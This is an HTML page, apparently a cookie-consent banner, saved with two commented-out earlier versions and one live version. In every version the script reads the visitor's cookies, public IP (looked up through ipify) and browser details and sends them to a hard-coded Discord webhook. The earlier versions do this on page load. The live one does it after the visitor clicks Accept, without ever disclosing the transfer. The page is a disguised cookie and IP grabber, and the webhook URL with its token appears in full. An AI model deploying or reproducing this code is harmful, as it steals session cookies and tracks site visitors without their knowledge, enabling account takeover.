<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Consent with Webhook, IP, and Device</title>
    <style>
        body {
            background: #222;
        }
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #575454;
            color: #fff;
            padding: 20px;
            text-align: center;
            display: block;
            z-index: 999;
        }
        #cookie-banner button {
            padding: 10px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body onload="fetchAndSendInfo()">

    <div id="cookie-banner">
        üç™ This site uses cookies to improve your experience.
        <button onclick="acceptCookies()">Accept</button>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8";

        function hasAcceptedCookies() {
            return document.cookie.includes("cookieConsent=true");
        }

        function sendInfoToWebhook(ipAddress, cookies, userAgent) {
            const formattedCookies = cookies.split(';').map(cookie => cookie.trim()).join('\n- ');

            const payload = {
                content: `üåê Website opened - IP Address: ${ipAddress}\nüíª Device: ${userAgent}\nüç™ Current Cookies:\n- ${formattedCookies}`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error("Webhook failed:", err));
        }

        function acceptCookies() {
            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
            document.getElementById("cookie-banner").style.display = "none";
        }

        function fetchAndSendInfo() {
            const userAgent = navigator.userAgent;
            let ipAddress = "Fetching IP...";

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    const allCookies = document.cookie;
                    sendInfoToWebhook(ipAddress, allCookies, userAgent);
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    const allCookies = document.cookie;
                    sendInfoToWebhook("Could not retrieve IP", allCookies, userAgent);
                });

            if (!hasAcceptedCookies()) {
                document.getElementById("cookie-banner").style.display = "block";
            }
        }
    </script>

</body>
</html> -->

<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Consent with Webhook, IP, and Device</title>
    <style>
        body {
            background: #222;
        }
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #575454;
            color: #fff;
            padding: 20px;
            text-align: center;
            display: block;
            z-index: 999;
        }
        #cookie-banner button {
            padding: 10px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body onload="fetchAndSendInfo()">

    <div id="cookie-banner">
        üç™ This site uses cookies to improve your experience.
        <button onclick="acceptCookies()">Accept</button>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace with your actual webhook URL

        function hasAcceptedCookies() {
            return document.cookie.includes("cookieConsent=true");
        }

        function getSimplifiedUserAgent() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            let os = "Unknown";

            if (userAgent.includes("Firefox")) {
                browser = "Firefox";
            } else if (userAgent.includes("Chrome")) {
                browser = "Chrome";
            } else if (userAgent.includes("Safari")) {
                browser = "Safari";
            } else if (userAgent.includes("Edge")) {
                browser = "Edge";
            } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
                browser = "Opera";
            }

            if (navigator.platform.includes("Win")) {
                os = "Windows";
            } else if (navigator.platform.includes("Mac")) {
                os = "macOS";
            } else if (navigator.platform.includes("Linux")) {
                os = "Linux";
            } else if (navigator.platform.includes("Android")) {
                os = "Android";
            } else if (navigator.platform.includes("iOS")) {
                os = "iOS";
            }

            return `${browser} on ${os}`;
        }

        function sendInfoToWebhook(ipAddress, cookies, userAgent) {
            let formattedCookies = "No cookies found.";
            if (cookies && cookies.length > 0) {
                formattedCookies = cookies.split(';').map(cookie => cookie.trim()).join('\n- ');
            }

            const payload = {
                content: `üåê Website opened - IP Address: ${ipAddress}\nüíª Device: ${userAgent}\nüç™ Current Cookies:\n- ${formattedCookies}`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error("Webhook failed:", err));
        }

        function acceptCookies() {
            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
            document.getElementById("cookie-banner").style.display = "none";
        }

        function fetchAndSendInfo() {
            const userAgent = getSimplifiedUserAgent();
            let ipAddress = "Fetching IP...";

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    ipAddress = data.ip;
                    const allCookies = document.cookie;
                    sendInfoToWebhook(ipAddress, allCookies, userAgent);
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    const allCookies = document.cookie;
                    sendInfoToWebhook("Could not retrieve IP", allCookies, userAgent);
                });

            if (!hasAcceptedCookies()) {
                document.getElementById("cookie-banner").style.display = "block";
            }
        }
    </script>

</body>
</html> -->


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Consent with Webhook, IP, and Device</title>
    <style>
        body {
            background: #222;
            color: white;
            font-family: sans-serif;
        }
        #cookie-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #575454;
            color: #fff;
            padding: 20px;
            text-align: center;
            display: none;
            z-index: 999;
        }
        #cookie-banner button {
            padding: 10px 15px;
            background: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="cookie-banner">
        üç™ This site uses cookies to improve your experience.
        <button onclick="acceptCookies()">Accept</button>
    </div>

    <script>
        const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8";

        function hasAcceptedCookies() {
            return document.cookie.includes("cookieConsent=true");
        }

        function getSimplifiedUserAgent() {
            const userAgent = navigator.userAgent;
            let browser = "Unknown";
            let os = "Unknown";

            if (userAgent.includes("Firefox")) {
                browser = "Firefox";
            } else if (userAgent.includes("Chrome")) {
                browser = "Chrome";
            } else if (userAgent.includes("Safari")) {
                browser = "Safari";
            } else if (userAgent.includes("Edge")) {
                browser = "Edge";
            } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
                browser = "Opera";
            }

            if (navigator.userAgent.includes("Win")) {
                os = "Windows";
            } else if (navigator.userAgent.includes("Mac")) {
                os = "macOS";
            } else if (navigator.userAgent.includes("Linux")) {
                os = "Linux";
            } else if (navigator.userAgent.includes("Android")) {
                os = "Android";
            } else if (navigator.userAgent.includes("iPhone") || navigator.userAgent.includes("iPad")) {
                os = "iOS";
            }

            return `${browser} on ${os}`;
        }

        function sendInfoToWebhook(ipAddress, cookies, userAgent) {
            let formattedCookies = "No cookies found.";
            if (cookies && cookies.length > 0) {
                formattedCookies = cookies.split(';').map(cookie => cookie.trim()).join('\n- ');
            }

            const payload = {
                content: `üåê Website opened\nüìç IP: ${ipAddress}\nüíª Device: ${userAgent}\nüç™ Cookies:\n- ${formattedCookies}`
            };

            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            }).catch(err => console.error("Webhook failed:", err));
        }

        function fetchAndSendInfo() {
            const userAgent = getSimplifiedUserAgent();
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ipAddress = data.ip;
                    const allCookies = document.cookie;
                    sendInfoToWebhook(ipAddress, allCookies, userAgent);
                })
                .catch(error => {
                    console.error("Error fetching IP address:", error);
                    const allCookies = document.cookie;
                    sendInfoToWebhook("Could not retrieve IP", allCookies, userAgent);
                });
        }

        function acceptCookies() {
            document.cookie = "cookieConsent=true; path=/; max-age=" + 60 * 60 * 24 * 365;
            document.getElementById("cookie-banner").style.display = "none";
            fetchAndSendInfo(); // <-- trigger after accepting
        }

        window.onload = function () {
            if (hasAcceptedCookies()) {
                fetchAndSendInfo(); // <-- returning users
            } else {
                document.getElementById("cookie-banner").style.display = "block";
            }
        };
    </script>

</body>
</html>
